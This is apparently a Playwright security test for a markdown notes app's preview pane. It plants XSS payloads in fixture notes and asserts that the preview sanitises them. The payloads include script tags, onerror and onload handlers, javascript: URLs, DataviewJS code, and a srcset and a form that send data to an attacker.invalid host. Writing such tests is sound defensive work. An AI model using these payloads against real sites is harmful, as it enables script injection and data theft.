import {chromium} from 'playwright';
import fs from 'node:fs/promises';
import path from 'node:path';
import os from 'node:os';
import assert from 'node:assert/strict';
import {once} from 'node:events';
import {Vault} from '../src/vault.mjs';
import {Graph} from '../src/graph.mjs';
import {Context} from '../src/context.mjs';
import {createServer} from '../src/server.mjs';
const root=await fs.mkdtemp(path.join(os.tmpdir(),'mastermind-browser-security-')),vault=await new Vault(root).init();
await vault.write('Welcome.md',`# Security fixture

<script>window.__pwned=1</script>
<img src="x" onerror="window.__pwned=2" srcset="https://attacker.invalid/leak 2x">
<iframe srcdoc="<script>parent.__pwned=3</script>"></iframe>
<object data="javascript:window.__pwned=4"></object>
<form action="https://attacker.invalid"><input name="secret" value="leak"></form>
<a href="javascript:window.__pwned=5">Click payload</a>
<svg><g onload="window.__pwned=6"></g></svg>
<div class="katex" style="position:fixed;inset:0;z-index:999999;background:red">Authored layout</div>
<math><mtext><img src=x onerror="window.__pwned=7"></mtext></math>

~~~dataviewjs
window.__pwned=8
~~~

~~~dataview
TABLE status FROM #project
~~~

![[Welcome]]

$\\href{javascript:window.__pwned=9}{unsafe}$
`,null);
await vault.write('Attack.md','---\ntags: [project]\nstatus: "<img src=x onerror=window.__pwned=10>"\n---\n# <img src=x onerror=window.__pwned=11>\n',null);
const graph=new Graph(vault),server=createServer(vault,graph,new Context(vault,graph));server.listen(0,'127.0.0.1');await once(server,'listening');
const browser=await chromium.launch({executablePath:process.env.BROWSER_PATH||'/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',headless:true});
try{
 await fs.mkdir('test-results',{recursive:true});const page=await browser.newPage(),errors=[],external=[],mutations=[];page.on('pageerror',e=>errors.push(e.message));page.on('request',r=>{if(/^https?:/.test(r.url())&&!r.url().startsWith('http://127.0.0.1:'))external.push(r.url());if(['PUT','DELETE'].includes(r.method()))mutations.push(r.url());});
 await page.goto(`http://127.0.0.1:${server.address().port}`);await page.waitForSelector('#preview table');await page.waitForFunction(()=>document.querySelector('#preview').textContent.includes('Embed berulang dihentikan'));
 assert.equal(await page.evaluate(()=>window.__pwned),undefined);assert.equal(await page.locator('#preview script,#preview iframe,#preview object,#preview form,#preview svg,#preview input').count(),0);
 assert.equal(await page.locator('#preview [onerror],#preview [onload],#preview [srcset],#preview [autoplay]').count(),0);
 assert.equal(await page.locator('#preview a[href^="javascript:"]').count(),0);
 assert.equal(await page.locator('#preview div').filter({hasText:/^Authored layout$/}).first().getAttribute('style'),null);
 assert.ok((await page.locator('#preview table').first().textContent()).includes('<img src=x onerror=window.__pwned=10>'));
 await page.getByText('Click payload',{exact:true}).first().click();assert.equal(await page.evaluate(()=>window.__pwned),undefined);
 assert.deepEqual(external,[]);assert.deepEqual(mutations,[]);assert.deepEqual(errors,[]);assert.ok((await vault.read('Welcome.md')).content.includes('Security fixture'));
 await page.screenshot({path:'test-results/security-preview.png',fullPage:true});console.log(JSON.stringify({passed:true,checks:['script/event/iframe/object/form/svg sanitization','javascript URL removal','authored layout isolation','query values remain text','DataviewJS nonexecution','recursive embed bound','no external requests','no automatic writes'],pageErrors:errors,externalRequests:external,unexpectedMutations:mutations},null,2));
}finally{await browser.close();await new Promise(r=>server.close(r));await fs.rm(root,{recursive:true,force:true});}
